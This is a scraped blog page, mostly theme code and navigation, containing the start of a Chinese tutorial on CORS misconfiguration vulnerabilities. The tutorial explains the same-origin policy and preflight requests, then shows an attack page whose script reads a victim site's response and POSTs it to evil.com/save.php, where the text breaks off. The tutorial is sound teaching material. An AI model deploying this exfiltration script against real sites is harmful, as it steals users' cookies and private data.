      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">CORS跨域漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-07-26T10:13:54.022Z" title="发表于 2023-07-26 18:13:54">2023-07-26</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-12T07:04:56.714Z" title="更新于 2024-04-12 15:04:56">2024-04-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">12.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="CORS跨域漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/07/26/cors-kua-yu-lou-dong/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/07/26/cors-kua-yu-lou-dong/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">CORS跨域漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-07-26T10:13:54.022Z" title="发表于 2023-07-26 18:13:54">2023-07-26</time><time itemprop="dateCreated datePublished" datetime="2024-04-12T07:04:56.714Z" title="更新于 2024-04-12 15:04:56">2024-04-12</time></header><h1 id="cors跨域漏洞">CORS跨域漏洞</h1>
<h2 id="0x01-漏洞简介">0x01 漏洞简介</h2>
<p>跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享 CORS 漏洞主要是由于程序员配置不当，对于 Origin 源校验不严格，从而造成跨域问题，攻击者可以利用 CORS 错误配置漏洞，从恶意网站跨域读取受害网站的敏感信息。</p>
<p>是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。</p>
<h3 id="同源策略">同源策略</h3>
<p>这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。源由通信协议，域和端口号组成。<br>
​SOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。</p>
<pre><code>简单来说:同时满足同协议，同域名，同端口这三个条件，就是同源。
		浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。

SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。
</code></pre>
<h3 id="跨域访问的一些场景">跨域访问的一些场景</h3>
<ol>
<li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li>
<li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。</li>
<li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li>
<li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li>
</ol>
<h3 id="跨域请求方式">跨域请求方式</h3>
<p>CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。</p>
<pre><code class="hljs plaintext">请求方法是以下三种方法之一：

- HEAD
- GET
- POST</code></pre>
<pre><code class="hljs plaintext">HTTP的头信息不超出以下几种字段：

- `Accept`
- `Accept-Language`
- `Content-Language`
- `Last-Event-ID`
- `Content-Type`：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`</code></pre>
<p>简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。</p>
<p>浏览器对简单请求和非简单请求的处理机制不一样。</p>
<blockquote>
<p>对于简单请求，浏览器就会立刻发送这个请求。<br>
对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。</p>
</blockquote>
<h2 id="0x02-cors跨域原理及漏洞成因">0x02 CORS跨域原理及漏洞成因</h2>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。<strong>当服务器接收到请求后发现Origin字段指定的域名在许可范围内</strong>，服务器会在响应包中增加三个与CORS相关的字段，Access-Control-Allow-Origin、Access-Control-Allow-Credentials、Access-Control-Expose-Headers。其中Access-Control-Allow-Origin字段是必须存在的，它的值可能是Origin字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大。<br>
再回到三个字段上，其中Access-Control-Allow-Credentials字段不是必选字段，它的值是一个布尔值且只能设置为true，表示服务器允许浏览器将cookie包含在请求中，否则就不添加此字段。但需要注意的是，如果要发送cookie，Access-Control-Allow-Origin就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略。而Access-Control-Expose-Headers字段主要是指定想要获取XMLHttpRequest对象中getResponseHeader（）方法的其他服务器字段。</p>
<p>所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。</p>
<p>CORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。<strong>因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。</strong></p>
<h2 id="0x03-cors漏洞攻击流程">0x03 CORS漏洞攻击流程</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151654619.png" alt="image-20230508151654619"></p>
<p><a target="_blank" rel="noopener" href="http://1.xn--CORSfoo-4t3kgmi4pdzm3o6bpdn4t0clfel5uw2r5oap54qqixatex.com">1.假设用户登陆一个含有CORS配置网站foo.com</a>，<a target="_blank" rel="noopener" href="http://xn--evil-k84fui0wi3eluix9emvas11m4pa17nc6ct30ix07a1d7bhzxb45d.com">同时又访问了攻击者提供的一个链接evil.com</a>。</p>
<p>2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。</p>
<p>3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
<p><a target="_blank" rel="noopener" href="http://foo.com/index.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/index.php代码如下</a><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151744373.png" alt="image-20230508151744373"></p>
<p><a target="_blank" rel="noopener" href="http://foo.com/phpinfo.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/phpinfo.php代码如下</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151757514.png" alt="image-20230508151757514"></p>
<p>在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151812220.png" alt="image-20230508151812220"></p>
<p>然后构造黑客发生送给用户的恶意页面<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
<pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span>&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CORS test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span></span>
<span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">loadXMLDoc</span>(<span class="hljs-params"></span>)</span></span>
<span class="language-javascript"><span class="language-xml">{</span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> xhr1;</span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> xhr2;</span></span>
<span class="language-javascript"><span class="language-xml">	</span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">XMLHttpRequest</span>)</span></span>
<span class="language-javascript"><span class="language-xml">    {</span></span>
<span class="language-javascript"><span class="language-xml">        xhr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span></span>
<span class="language-javascript"><span class="language-xml">        xhr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span></span>
<span class="language-javascript"><span class="language-xml">    }</span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">else</span></span></span>
<span class="language-javascript"><span class="language-xml">    {</span></span>
<span class="language-javascript"><span class="language-xml">        xhr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);</span></span>
<span class="language-javascript"><span class="language-xml">        xhr2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);</span></span>
<span class="language-javascript"><span class="language-xml">    }</span></span>
<span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-property">onreadystatechange</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span></span>
<span class="language-javascript"><span class="language-xml">    {</span></span>
<span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">if</span>(xhr1.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; xhr1.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) <span class="hljs-comment">//if receive xhr1 response</span></span></span>
<span class="language-javascript"><span class="language-xml">        {</span></span>
<span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">var</span> datas=xhr1.<span class="hljs-property">responseText</span>;</span></span>
<span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">open</span>(<span class="hljs-string">"POST"</span>,<span class="hljs-string">"http://evil.com/save.php"</span>,<span class="hljs-string">"true"</span>);</span></span>
<span class="language-javascript"><span class="language-xml">			<span class="hljs-title function_">alert</span>(<span class="hljs-string">'3'</span>);</span></span>
<span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">"Content-type"</span>,<span class="hljs-string">"application/x-www-form-urlencoded;charset=utf-8"</span>);</span></span>
